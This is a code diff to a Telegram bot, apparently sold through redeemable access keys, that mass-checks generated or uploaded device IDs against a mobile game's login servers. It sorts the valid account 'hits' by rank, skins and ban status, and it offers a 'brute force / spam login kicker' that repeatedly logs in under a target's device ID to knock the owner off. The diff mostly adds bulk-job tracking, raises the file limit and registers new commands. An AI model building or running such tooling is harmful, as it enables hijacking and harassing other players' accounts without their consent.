     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
 
 async def show_single_menu(query, context):
     text = (
-        "🔍 <b>SINGLE ACCOUNT CHECK </b>\n"
+        "🔍 <b>SINGLE ACCOUNT CHECK</b>\n"
         "═══════════════════════════\n"
         "Send me a <b>Device ID</b> to check.\n\n"
         "This will perform a full 8-request check:\n"
@@ -1567,13 +2001,15 @@ async def show_single_menu(query, context):
         "• Heroes & skins count\n"
         "• V2L status\n"
         "• Account creation date\n\n"
+        "💡 Usage: <code>/single and_xxxx...</code>\n"
+        "Or just send the device ID directly.\n\n"
         "Type /cancel to abort."
     )
     await query.edit_message_text(text, parse_mode=ParseMode.HTML)
 
 async def show_bulk_menu(query, context):
     text = (
-        "📂 <b>BULK CHECK (8-REQ FULL DETAIL)</b>\n"
+        f"📂 <b>BULK CHECK (MAX {MAX_BULK_DEVICES:,})</b>\n"
         "═══════════════════════════\n"
         "📤 <b>Upload a .txt file</b> containing device IDs (one per line).\n\n"
         "🔍 The bot will:\n"
@@ -1581,7 +2017,9 @@ async def show_bulk_menu(query, context):
         "• Sort accounts by rank\n"
         "• Detect V2L status\n"
         "• Filter banned accounts\n"
-        "• Auto-upload result files when complete\n\n"
+        "• Auto-upload result files when complete\n"
+        f"• Max {MAX_BULK_DEVICES:,} devices per file\n\n"
+        "💡 Use /status to check job progress\n"
         "Type /cancel to abort."
     )
     await query.edit_message_text(text, parse_mode=ParseMode.HTML)
@@ -1602,10 +2040,8 @@ async def show_bf_menu(query, context):
         f"{limit_text}\n"
         f"═══════════════════════════\n"
         f"Send me a <b>Device ID</b> to target.\n\n"
-        f"The bot will:\n"
-        f"1️⃣ Verify the device & fetch account profile\n"
-        f"2️⃣ Show you account details\n"
-        f"3️⃣ Let you choose kick mode\n\n"
+        f"Usage: <code>/bruteforce and_xxxx...</code>\n"
+        f"Or just send the device ID directly.\n\n"
         f"Type /cancel to abort."
     )
     await query.edit_message_text(text, parse_mode=ParseMode.HTML)
@@ -1717,6 +2153,8 @@ async def show_profile(query, user_id, context):
     else:
         expiry = get_user_expiry_info(user_id)
         used_count, limit = get_user_bf_usage_stats(user_id)
+        active_jobs = get_user_active_jobs(user_id)
+        
         text = (
             f"👤 <b>MY PROFILE</b>\n"
             f"═══════════════════════════\n"
@@ -1729,25 +2167,41 @@ async def show_profile(query, user_id, context):
             f"  📊 Used: {used_count}/{limit}\n"
             f"  💡 Each device can only be used once\n"
             f"  ♻️ Usage is refunded if you cancel/stop\n"
-            f"═══════════════════════════\n"
-            f"✨ Created by: @ZyronDevv"
         )
+        
+        if active_jobs:
+            text += f"═══════════════════════════\n📊 <b>Active Bulk Jobs:</b> {len(active_jobs)}\n"
+            for job in active_jobs:
+                progress = (job['processed'] / job['total'] * 100) if job['total'] > 0 else 0
+                text += f"  🆔 {job['job_id']}: {progress:.1f}%\n"
+        
+        text += "═══════════════════════════\n✨ Created by: @ZyronDevv"
+    
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
 
 async def show_help(query, context):
     text = (
         "ℹ️ <b>HELP & COMMANDS</b>\n"
         "═══════════════════════════\n\n"
-        "<b>Commands:</b>\n"
-        "• /start - Show main menu\n"
-        "• /redeem KEY - Activate access key\n"
-        "• /cancel - Cancel current operation\n"
-        "• /help - Show this help\n"
-        "• /mykey - View your access info\n\n"
+        "<b>Available Commands:</b>\n"
+        "• /start - Show this message\n"
+        "• /help - Show help\n"
+        "• /about - About this bot\n"
+        "• /single - Check a single device ID\n"
+        "• /bulk - Upload file for bulk check\n"
+        "• /status - Check bulk job status\n"
+        "• /cancel - Cancel a running bulk job\n"
+        "• /redeem - Redeem subscription key\n"
+        "• /mykey - Check subscription status\n"
+        "• /bruteforce - Brute force / spam login kicker\n"
+        "• /bfstop - Stop a running brute force\n"
+        "• /bfstatus - Show current brute force status\n\n"
+        "<b>Device ID Format:</b>\n"
+        "<code>and_a1b2c3d4e5f6...</code>\n\n"
         "<b>Features:</b>\n"
         "🔨 <b>Generate Devices</b> - Create random device IDs\n"
-        "🔍 <b>Single Check</b> - Check one device \n"
-        "📂 <b>Bulk Check</b> - Upload .txt file to check many\n"
+        "🔍 <b>Single Check</b> - Check one device\n"
+        "📂 <b>Bulk Check</b> - Upload .txt file (max 100K)\n"
         "⚡ <b>Brute Force</b> - Spam login kicker\n"
         "📊 <b>Statistics</b> - View hit counters\n"
         "👤 <b>My Profile</b> - View your access info\n\n"
@@ -1898,8 +2352,6 @@ async def run_spam_kick(query, context, device_id, total_loops, delay_sec, user_
         )
         return
     
-    # Provisionally commit usage so concurrent kicks are blocked.
-    # This will be REFUNDED at the end if the kick is stopped/cancelled.
     if not is_admin(user_id):
         add_user_bf_device(user_id, device_id)
     
@@ -2008,13 +2460,11 @@ async def run_spam_kick(query, context, device_id, total_loops, delay_sec, user_
     was_stopped = context.user_data.get("bf_stop_flag", False) or context.user_data.get("bf_refunded", False)
     context.user_data["bf_stop_flag"] = False
     
-    # ─── REFUND BF USAGE IF CANCELLED/STOPPED ───
     refund_note = ""
     if not is_admin(user_id):
         if was_stopped or context.user_data.get("bf_refunded", False):
             if refund_user_bf_device(user_id, device_id):
                 refund_note = "\n♻️ <b>Usage refunded (+1 remaining)</b>"
-        # If completed normally, usage stays committed (already added at start)
     
     context.user_data["bf_refunded"] = False
     
@@ -2210,8 +2660,6 @@ async def handle_admin_callback(query, data, context):
             f"═══════════════════════════"
         )
         await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
-    
-    # ─── BF LIMITS ADMIN ─────────────────────────────────────────
     
     elif data == "admin_bf_limits":
         global_limit = get_bf_limit()
@@ -2414,10 +2862,6 @@ async def handle_admin_bf_text(update: Update, context: ContextTypes.DEFAULT_TYP
 # ────────────────────────────────────────────────────────────────
 
 async def _conversation_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Router for the ConversationHandler entry point.
-    Returns the appropriate state based on user_data flags, or ConversationHandler.END.
-    """
     stage = context.user_data.get("bf_custom_stage")
     if stage == "loops":
         return STATE_BF_CUSTOM_LOOPS
@@ -2448,28 +2892,23 @@ async def handle_all_text_input(update: Update, context: ContextTypes.DEFAULT_TY
     if not text:
         return
     
-    # Safety guard - if conv state is active, skip (ConversationHandler should handle)
     if (context.user_data.get("bf_custom_stage") or 
         context.user_data.get("admin_conv_state")):
         return
     
-    # Priority 1: Admin BF action pending
     action = context.user_data.get("admin_bf_action")
     if action and is_admin(user_id):
         await handle_admin_bf_text(update, context, text, action)
         return
     
-    # Priority 2: Single check input
     if context.user_data.get("waiting_for_single_check"):
         await handle_single_check_input(update, context)
         return
     
-    # Priority 3: Brute force device input
     if context.user_data.get("waiting_for_bruteforce"):
         await handle_bf_device_input(update, context)
         return
     
-    # Default: no active operation
     if is_admin(user_id):
         await update.message.reply_text(
             "ℹ️ Select an option from the menu below:",
@@ -2485,14 +2924,8 @@ async def handle_all_text_input(update: Update, context: ContextTypes.DEFAULT_TY
 # 23. SINGLE CHECK INPUT
 # ────────────────────────────────────────────────────────────────
 
-async def handle_single_check_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    device_id = update.message.text.strip()
-    if device_id.lower() == '/cancel':
-        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
-        context.user_data["waiting_for_single_check"] = False
-        return
-    
-    context.user_data["waiting_for_single_check"] = False
+async def process_single_device(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
+    """Process a single device ID check"""
     await update.message.reply_text("⏳ Checking account... Please wait.", reply_markup=ReplyKeyboardRemove())
     
     result = [None, None]
@@ -2568,18 +3001,23 @@ async def handle_single_check_input(update: Update, context: ContextTypes.DEFAUL
     
     await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
 
+async def handle_single_check_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    device_id = update.message.text.strip()
+    if device_id.lower() == '/cancel':
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
+        context.user_data["waiting_for_single_check"] = False
+        return
+    
+    context.user_data["waiting_for_single_check"] = False
+    await process_single_device(update, context, device_id)
+
 # ────────────────────────────────────────────────────────────────
 # 24. BRUTE FORCE DEVICE INPUT
 # ────────────────────────────────────────────────────────────────
 
-async def handle_bf_device_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    device_id = update.message.text.strip()
+async def process_bf_device(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
+    """Process a device for brute force"""
     user_id = update.effective_user.id
-    
-    if device_id.lower() == '/cancel':
-        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
-        context.user_data["waiting_for_bruteforce"] = False
-        return
     
     user_devices = get_user_bf_devices(user_id)
     limit = get_bf_limit(user_id)
@@ -2671,8 +3109,18 @@ async def handle_bf_device_input(update: Update, context: ContextTypes.DEFAULT_T
     
     await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
 
+async def handle_bf_device_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    device_id = update.message.text.strip()
+    
+    if device_id.lower() == '/cancel':
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
+        context.user_data["waiting_for_bruteforce"] = False
+        return
+    
+    await process_bf_device(update, context, device_id)
+
 # ────────────────────────────────────────────────────────────────
-# 25. BF CUSTOM HANDLERS (ConversationHandler states)
+# 25. BF CUSTOM HANDLERS
 # ────────────────────────────────────────────────────────────────
 
 async def handle_bf_custom_loops(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2756,11 +3204,28 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Only .txt files are supported!")
         return
     
+    user_id = update.effective_user.id
+    
+    # Check for existing active jobs
+    active_jobs = get_user_active_jobs(user_id)
+    if active_jobs and not is_admin(user_id):
+        await update.message.reply_text(
+            f"⚠️ <b>You already have {len(active_jobs)} active job(s)!</b>\n"
+            f"Please wait for them to complete or cancel them first.\n"
+            f"Use /status to check progress.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
     status_msg = await update.message.reply_text("⏳ Downloading file...")
     
     try:
         file = await doc.get_file()
-        file_path = os.path.join(OUTPUT_DIR, FOLDERS["split"], f"upload_{int(time.time())}.txt")
+        session_id = f"bulk_{int(time.time())}"
+        session_dir = os.path.join(OUTPUT_DIR, "bulk_sessions", session_id)
+        os.makedirs(session_dir, exist_ok=True)
+        
+        file_path = os.path.join(session_dir, "input_devices.txt")
         await file.download_to_drive(file_path)
         
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
@@ -2770,29 +3235,36 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.edit_text("❌ No device IDs found in file!")
             return
         
-        # Limit to prevent abuse
-        if len(devices) > 5000:
-            await status_msg.edit_text(f"❌ Too many devices! Max 5000 per file. Found: {len(devices)}")
+        if len(devices) > MAX_BULK_DEVICES:
+            await status_msg.edit_text(
+                f"❌ Too many devices! Max {MAX_BULK_DEVICES:,} per file.\n"
+                f"Found: {len(devices):,}"
+            )
             return
         
-        # ─── CREATE SESSION-SPECIFIC OUTPUT DIRECTORY ───
-        session_id = f"bulk_{int(time.time())}"
-        session_dir = os.path.join(OUTPUT_DIR, "bulk_sessions", session_id)
-        os.makedirs(session_dir, exist_ok=True)
+        # Create job record
+        create_bulk_job(user_id, len(devices), session_id)
         
         # Session-specific file paths
         session_files = {
             "all_hits_detail": os.path.join(session_dir, "all_hits_detail.txt"),
             "raw_devices_detail": os.path.join(session_dir, "raw_devices_detail.txt"),
             "banned_accounts": os.path.join(session_dir, "banned_accounts.txt"),
+            "v2l_active": os.path.join(session_dir, "v2l_active.txt"),
+            "v2l_inactive": os.path.join(session_dir, "v2l_inactive.txt"),
+            "sultan": os.path.join(session_dir, "sultan.txt"),
+            "warrior": os.path.join(session_dir, "warrior_hits.txt"),
+            "elite": os.path.join(session_dir, "elite_hits.txt"),
+            "master": os.path.join(session_dir, "master_hits.txt"),
+            "gm": os.path.join(session_dir, "grandmaster_hits.txt"),
+            "epic": os.path.join(session_dir, "epic_hits.txt"),
             "legend": os.path.join(session_dir, "legend_hits.txt"),
             "mythic": os.path.join(session_dir, "mythic_hits.txt"),
         }
         
-        # Initialize empty session files
         for fpath in session_files.values():
             with open(fpath, 'w', encoding='utf-8') as f:
-                pass  # Create empty file
+                pass
         
         stats = {
             "total": len(devices), "processed": 0, "hits": 0, "info": 0,
@@ -2805,9 +3277,7 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "start_time": time.time()
         }
         
-        # ─── SESSION-SPECIFIC SAVE FUNCTION ───
         def save_account_session(account_info: dict, player_data: dict):
-            """Save account to session-specific files only."""
             device = account_info.get('Device id', '')
             acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')
             ban_stat = player_data.get('ban_status', 'NORMAL')
@@ -2831,20 +3301,17 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             card_text = format_account_card(device, acc, zone, player_data)
             
-            # Write to session-specific files
             with open(session_files["all_hits_detail"], "a", encoding='utf-8') as f:
                 f.write(card_text + "\n")
             
             with open(session_files["raw_devices_detail"], "a", encoding='utf-8') as f:
                 f.write(f"{device}\n")
             
-            # Rank file
             rank_key = rank_category if rank_category in session_files else None
             if rank_key and rank_key in session_files:
                 with open(session_files[rank_key], "a", encoding='utf-8') as f:
                     f.write(card_text + "\n")
             
-            # V2L files
             if v2l_text == "ACTIVE":
                 with open(session_files["v2l_active"], "a", encoding='utf-8') as f:
                     f.write(card_text + "\n")
@@ -2852,14 +3319,11 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 with open(session_files["v2l_inactive"], "a", encoding='utf-8') as f:
                     f.write(card_text + "\n")
             
-            # Sultan file
             if skin >= 200:
                 with open(session_files["sultan"], "a", encoding='utf-8') as f:
                     f.write(card_text + "\n")
         
-        # ─── SESSION-SPECIFIC DETAIL PROCESSOR ───
         def process_detail_session(device_id: str, account_id: int, zone_id: int) -> Optional[dict]:
-            """Process detail and save to session files."""
             try:
                 with GameConnection(device_id=device_id) as conn:
                     if not conn.login_to_login_server():
@@ -2886,7 +3350,6 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     result = conn.lookup_player(account_id)
                     role_info = conn.get_role_info(account_id, zone_id)
                     
-                    # Robust player data extraction
                     pd = {}
                     if result and isinstance(result, dict):
                         if isinstance(result.get(0), list) and len(result[0]) > 0:
@@ -2999,7 +3462,6 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             processed = 0
             failed = 0
             
-            # Login checks in parallel
             login_results = []
             with ThreadPoolExecutor(max_workers=50) as ex:
                 futures = {ex.submit(GameLogin(dev).run): dev for dev in devices}
@@ -3023,8 +3485,10 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         stats["processed"] = processed
                         stats["failed"] += 1
                         failed += 1
+                    
+                    if processed % 100 == 0:
+                        update_bulk_job(session_id, processed=processed, hits=hits, failed=failed)
             
-            # Detail checks in parallel (using session-specific processor)
             with ThreadPoolExecutor(max_workers=50) as ex:
                 futures = []
                 for dev, acc, zone in login_results:
@@ -3046,13 +3510,27 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     stats["processed"] = processed
                     stats["hits"] = hits
                     stats["failed"] = failed
+                    
+                    if processed % 100 == 0:
+                        update_bulk_job(session_id, processed=processed, hits=hits, failed=failed)
+            
+            update_bulk_job(
+                session_id,
+                processed=processed,
+                hits=hits,
+                failed=failed,
+                status="completed",
+                completed_at=datetime.now(TZ_WIB).isoformat()
+            )
         
         t = threading.Thread(target=do_bulk, daemon=True)
         t.start()
         
         await status_msg.edit_text(
-            f"📊 <b>Loaded {stats['total']} IDs.</b>\n"
-            f"⏳ Starting...",
+            f"📊 <b>Loaded {stats['total']:,} IDs.</b>\n"
+            f"🆔 Job ID: <code>{session_id}</code>\n"
+            f"⏳ Starting...\n\n"
+            f"💡 Use /status to check progress",
             parse_mode=ParseMode.HTML
         )
         
@@ -3060,21 +3538,26 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         while t.is_alive():
             await asyncio.sleep(1)
             if time.time() - last_update >= 3:
-                elapsed = time.time() - stats["start_time"]
-                speed = stats["processed"] / elapsed if elapsed > 0 else 0
-                eta = (stats["total"] - stats["processed"]) / speed if speed > 0 else 0
-                try:
-                    await status_msg.edit_text(
-                        f"📊 <b>Task Running...</b>\n"
-                        f"Total checked: {stats['processed']}/{stats['total']}\n"
-                        f"Valid found: {stats['hits']}\n"
-                        f"Failed: {stats['failed']}\n"
-                        f"Speed: {speed:.1f}/s\n"
-                        f"ETA: {eta/60:.1f}m",
-                        parse_mode=ParseMode.HTML
-                    )
-                except Exception:
-                    pass
+                job = get_bulk_job(session_id)
+                if job:
+                    elapsed = time.time() - stats["start_time"]
+                    speed = job["processed"] / elapsed if elapsed > 0 else 0
+                    eta = (job["total"] - job["processed"]) / speed if speed > 0 else 0
+                    try:
+                        await status_msg.edit_text(
+                            f"📊 <b>Job {session_id}</b>\n"
+                            f"═══════════════════════════\n"
+                            f"📈 Progress: {job['processed']:,}/{job['total']:,}\n"
+                            f"✅ Hits: {job['hits']:,}\n"
+                            f"❌ Failed: {job['failed']:,}\n"
+                            f"⚡ Speed: {speed:.1f}/s\n"
+                            f"⏱️ ETA: {eta/60:.1f}m\n"
+                            f"═══════════════════════════\n"
+                            f"💡 Use /status for details",
+                            parse_mode=ParseMode.HTML
+                        )
+                    except Exception:
+                        pass
                 last_update = time.time()
         
         elapsed = time.time() - stats["start_time"]
@@ -3084,21 +3567,23 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         success_rate = (stats["hits"] / stats["processed"] * 100) if stats["processed"] > 0 else 0
         
         final_text = (
-            f"✅ <b>Task Complete!</b>\n\n"
-            f"Total checked: {stats['processed']}\n"
-            f"Valid found: {stats['hits']}\n"
-            f"Failed: {stats['failed']}\n"
-            f"Success rate: {success_rate:.2f}%\n"
-            f"Total time: {minutes}m {seconds}s\n"
-            f"Avg speed: {speed:.1f}/s\n\n"
-            f"📈 <b>Level</b>\n"
+            f"✅ <b>Bulk Check Complete!</b>\n"
+            f"═══════════════════════════\n"
+            f"🆔 Job ID: <code>{session_id}</code>\n"
+            f"📊 Total: {stats['processed']:,}\n"
+            f"🎯 Valid: {stats['hits']:,}\n"
+            f"❌ Failed: {stats['failed']:,}\n"
+            f"📈 Success Rate: {success_rate:.2f}%\n"
+            f"⏱️ Time: {minutes}m {seconds}s\n"
+            f"⚡ Speed: {speed:.1f}/s\n\n"
+            f"📈 <b>Level Distribution:</b>\n"
             f"1-30: {stats['level_1_30']} | 31-50: {stats['level_31_50']}\n"
             f"51-99: {stats['level_51_99']} | 100+: {stats['level_100_plus']}\n\n"
-            f"🎨 <b>Skin</b>\n"
+            f"🎨 <b>Skin Distribution:</b>\n"
             f"1-50: {stats['skin_1_50']} | 51-99: {stats['skin_51_99']}\n"
             f"100-250: {stats['skin_100_250']} | 251-300: {stats['skin_251_300']}\n"
             f"301-400: {stats['skin_301_400']} | 401+: {stats['skin_400_plus']}\n\n"
-            f"🏆 <b>Rank</b>\n"
+            f"🏆 <b>Rank Distribution:</b>\n"
             f"Warrior: {stats['rank_warrior']} | Elite: {stats['rank_elite']}\n"
             f"Master: {stats['rank_master']} | GM: {stats['rank_gm']}\n"
             f"Epic: {stats['rank_epic']} | Legend: {stats['rank_legend']}\n"
@@ -3106,21 +3591,23 @@ async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         await status_msg.edit_text(final_text, parse_mode=ParseMode.HTML)
-        await upload_bulk_results(update, context, stats, session_files)
+        await upload_bulk_results(update, context, stats, session_files, session_id)
         
     except Exception as e:
         await status_msg.edit_text(f"❌ Error processing file: {str(e)}")
 
 
-async def upload_bulk_results(update: Update, context: ContextTypes.DEFAULT_TYPE, stats: dict, session_files: dict):
+async def upload_bulk_results(update: Update, context: ContextTypes.DEFAULT_TYPE, stats: dict, session_files: dict, session_id: str):
     """Upload session-specific result files."""
-    upload_msg = await update.message.reply_text("📤 <b>Uploading result files...</b>", parse_mode=ParseMode.HTML)
+    upload_msg = await update.message.reply_text(
+        f"📤 <b>Uploading result files for job {session_id}...</b>",
+        parse_mode=ParseMode.HTML
+    )
     
     files_uploaded = []
     files_failed = []
     files_to_upload = []
     
-    # Map session files to display names
     file_map = {
         "all_hits_detail": "all_hits_detail.txt",
         "raw_devices_detail": "raw_devices_detail.txt",
@@ -3161,15 +3648,19 @@ async def upload_bulk_results(update: Update, context: ContextTypes.DEFAULT_TYPE
         except Exception as e:
             files_failed.append(f"{display_name}: {str(e)[:50]}")
     
-    summary = "✅ <b>Bulk Check Complete!</b>\n\n"
-    summary += f"📊 Total: {stats['processed']}\n"
-    summary += f"🎯 Valid: {stats['hits']}\n"
+    summary = (
+        f"✅ <b>Bulk Check Complete!</b>\n"
+        f"═══════════════════════════\n"
+        f"🆔 Job ID: <code>{session_id}</code>\n"
+        f"📊 Total: {stats['processed']:,}\n"
+        f"🎯 Valid: {stats['hits']:,}\n"
+    )
     if files_uploaded:
-        summary += f"\n📄 Uploaded files ({len(files_uploaded)}):\n"
+        summary += f"\n📄 <b>Uploaded Files ({len(files_uploaded)}):</b>\n"
         for fname in files_uploaded:
             summary += f"  • {fname}\n"
     if files_failed:
-        summary += f"\n❌ Failed: {', '.join(files_failed)}"
+        summary += f"\n❌ <b>Failed:</b> {', '.join(files_failed)}"
     
     await upload_msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
 
@@ -3185,9 +3676,17 @@ async def handle_admin_delete_key(update: Update, context: ContextTypes.DEFAULT_
         return ConversationHandler.END
     
     if delete_key(key_code):
-        await update.message.reply_text(f"✅ Key <code>{key_code}</code> deleted!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+        await update.message.reply_text(
+            f"✅ Key <code>{key_code}</code> deleted!",
+            parse_mode=ParseMode.HTML,
+            reply_markup=admin_panel_keyboard()
+        )
     else:
-        await update.message.reply_text(f"❌ Key not found!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+        await update.message.reply_text(
+            f"❌ Key not found!",
+            parse_mode=ParseMode.HTML,
+            reply_markup=admin_panel_keyboard()
+        )
     return ConversationHandler.END
 
 async def handle_admin_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3206,9 +3705,17 @@ async def handle_admin_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     context.user_data.pop("admin_conv_state", None)
     if revoke_user_access(user_id):
-        await update.message.reply_text(f"✅ User <code>{user_id}</code> revoked!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+        await update.message.reply_text(
+            f"✅ User <code>{user_id}</code> revoked!",
+            parse_mode=ParseMode.HTML,
+            reply_markup=admin_panel_keyboard()
+        )
     else:
-        await update.message.reply_text(f"❌ User not found!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+        await update.message.reply_text(
+            f"❌ User not found!",
+            parse_mode=ParseMode.HTML,
+            reply_markup=admin_panel_keyboard()
+        )
     return ConversationHandler.END
 
 async def handle_admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3236,7 +3743,8 @@ async def handle_admin_broadcast(update: Update, context: ContextTypes.DEFAULT_T
     
     await update.message.reply_text(
         f"✅ <b>Broadcast Complete!</b>\nSent: {sent} | Failed: {failed}",
-        parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard()
+        parse_mode=ParseMode.HTML,
+        reply_markup=admin_panel_keyboard()
     )
     return ConversationHandler.END
 
@@ -3286,7 +3794,8 @@ async def handle_admin_adduser(update: Update, context: ContextTypes.DEFAULT_TYP
         f"✅ <b>User Added!</b>\n"
         f"🆔 User ID: <code>{target_id}</code>\n"
         f"♾️ Access: Lifetime",
-        parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard()
+        parse_mode=ParseMode.HTML,
+        reply_markup=admin_panel_keyboard()
     )
     return ConversationHandler.END
 
@@ -3296,13 +3805,14 @@ async def handle_admin_adduser(update: Update, context: ContextTypes.DEFAULT_TYP
 
 def main():
     print("=" * 60)
-    print("🤖 PREMIUM DEVICE ID BOT V1.0")
+    print("🤖 PREMIUM DEVICE ID BOT V2.0")
     print("👑 Created by: @ZyronDevv")
     print("=" * 60)
     print(f"📁 Output Dir: {OUTPUT_DIR}")
     print(f"🔑 Keys File: {KEYS_FILE}")
     print(f"👥 Users File: {USERS_FILE}")
     print(f"⚡ BF Limits File: {BF_LIMITS_FILE}")
+    print(f"📊 Bulk Jobs File: {BULK_JOBS_FILE}")
     print(f"🛡️ Admin IDs: {ADMIN_IDS}")
     print("=" * 60)
     print("🚀 Starting bot...")
@@ -3313,25 +3823,32 @@ def main():
         save_json(USERS_FILE, {})
     if not os.path.exists(BF_LIMITS_FILE):
         save_json(BF_LIMITS_FILE, {"device_limit": 1, "users": {}, "user_overrides": {}})
-
+    if not os.path.exists(BULK_JOBS_FILE):
+        save_json(BULK_JOBS_FILE, {})
     
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # Commands
+    # ─── COMMANDS ───
     app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("redeem", cmd_redeem))
     app.add_handler(CommandHandler("help", cmd_help))
-    app.add_handler(CommandHandler("mykey", cmd_mykey))
+    app.add_handler(CommandHandler("about", cmd_about))
+    app.add_handler(CommandHandler("single", cmd_single))
+    app.add_handler(CommandHandler("bulk", cmd_bulk))
+    app.add_handler(CommandHandler("status", cmd_status))
     app.add_handler(CommandHandler("cancel", cmd_cancel))
+    app.add_handler(CommandHandler("redeem", cmd_redeem))
+    app.add_handler(CommandHandler("mykey", cmd_mykey))
+    app.add_handler(CommandHandler("bruteforce", cmd_bruteforce))
+    app.add_handler(CommandHandler("bfstop", cmd_bfstop))
+    app.add_handler(CommandHandler("bfstatus", cmd_bfstatus))
     
-    # Inline button callbacks
+    # ─── CALLBACKS ───
     app.add_handler(CallbackQueryHandler(callback_handler))
     
-    # ─── IMPORTANT: Register document handler FIRST ───
-    # This must come before the ConversationHandler to catch file uploads
+    # ─── DOCUMENT HANDLER (must come before conversation handler) ───
     app.add_handler(MessageHandler(filters.Document.ALL, handle_bulk_file))
     
-    # ConversationHandler for text input states
+    # ─── CONVERSATION HANDLER ───
     conv_handler = ConversationHandler(
         entry_points=[
             MessageHandler(filters.TEXT & ~filters.COMMAND, _conversation_router),
@@ -3359,12 +3876,12 @@ def main():
         fallbacks=[CommandHandler("cancel", cmd_cancel)],
         per_user=True,
         per_chat=True,
-        per_message=True,  # Changed to False to avoid conflicts
+        per_message=False,
         allow_reentry=True,
     )
     app.add_handler(conv_handler)
     
-    # UNIFIED text handler for general messages
+    # ─── UNIFIED TEXT HANDLER ───
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_input))
     
     print("✅ Bot is running! Press Ctrl+C to stop.")
